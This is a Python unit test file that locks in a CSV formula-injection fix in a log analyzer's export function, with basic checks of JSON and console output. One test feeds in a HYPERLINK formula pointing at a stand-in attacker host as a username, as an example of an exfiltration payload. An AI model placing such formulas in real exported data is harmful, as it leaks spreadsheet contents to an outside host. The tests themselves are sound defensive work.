"""Unit tests for log_analyzer.report.

Not exhaustive coverage of every code path in report.py -- added
specifically during the Phase 6 audit to lock in the CSV formula-
injection fix in export_csv with a real regression test, rather than
leaving a security fix verified only by hand. A couple of basic sanity
checks for export_json and print_console_summary are included too,
since this file previously had no automated coverage at all.
"""

import csv
import io
import json
import tempfile
import unittest
from contextlib import redirect_stdout
from datetime import datetime
from pathlib import Path

from log_analyzer.analyzer import AnalysisResult
from log_analyzer.models import Alert, Severity
from log_analyzer.report import export_csv, export_json, print_console_summary


def _make_result(*alerts: Alert) -> AnalysisResult:
    return AnalysisResult(
        alerts=list(alerts), auth_log_path="auth.log", access_log_path=None,
        auth_events_parsed=1, access_events_parsed=0,
    )


def _make_alert(username: str = "alice", description: str = "test alert", source_ip: str = "203.0.113.1") -> Alert:
    return Alert(
        rule_id="invalid_user_probe", title="Invalid-User Login Probing", severity=Severity.LOW,
        description=description, timestamp=datetime(2026, 7, 14, 9, 0, 0), source_file="auth.log",
        source_ip=source_ip, username=username, evidence_lines=[1, 2, 3],
    )


class TestExportCsvFormulaInjection(unittest.TestCase):
    """The fix added during the Phase 6 audit: attacker-influenced
    fields (description, source_ip, username, source_file) get a
    leading single quote if they'd otherwise start with a character a
    spreadsheet app would treat as the start of a formula.
    """

    def _read_first_row(self, path: Path) -> dict:
        with path.open(encoding="utf-8", newline="") as handle:
            return next(csv.DictReader(handle))

    def test_formula_prefixed_username_gets_neutralized(self):
        alert = _make_alert(username='=HYPERLINK("http://evil.example/"&A1)')
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "out.csv"
            export_csv(_make_result(alert), out)
            row = self._read_first_row(out)
        self.assertTrue(row["username"].startswith("'="))

    def test_each_trigger_character_gets_neutralized(self):
        for trigger in ("=", "+", "-", "@"):
            alert = _make_alert(description=f"{trigger}SUM(1+1)")
            with tempfile.TemporaryDirectory() as tmp:
                out = Path(tmp) / "out.csv"
                export_csv(_make_result(alert), out)
                row = self._read_first_row(out)
            self.assertTrue(row["description"].startswith(f"'{trigger}"), f"trigger char {trigger!r} was not neutralized")

    def test_ordinary_values_are_left_completely_unchanged(self):
        # The fix should be invisible for every normal alert -- this
        # project's real sample data never touches this path at all.
        alert = _make_alert(username="contractor_bob", description="sudo authentication failure", source_ip="198.51.100.22")
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "out.csv"
            export_csv(_make_result(alert), out)
            row = self._read_first_row(out)
        self.assertEqual(row["username"], "contractor_bob")
        self.assertEqual(row["description"], "sudo authentication failure")
        self.assertEqual(row["source_ip"], "198.51.100.22")


class TestReportBasics(unittest.TestCase):
    """Baseline sanity coverage -- report.py had none before this audit."""

    def test_export_json_round_trips_alert_count(self):
        alert = _make_alert()
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "out.json"
            export_json(_make_result(alert), out)
            data = json.loads(out.read_text(encoding="utf-8"))
        self.assertEqual(data["total_alerts"], 1)
        self.assertEqual(len(data["alerts"]), 1)

    def test_console_summary_reports_no_activity_cleanly(self):
        result = AnalysisResult(alerts=[], auth_log_path="auth.log", access_log_path=None, auth_events_parsed=0, access_events_parsed=0)
        buffer = io.StringIO()
        with redirect_stdout(buffer):
            print_console_summary(result)
        self.assertIn("No suspicious activity detected.", buffer.getvalue())


if __name__ == "__main__":
    unittest.main()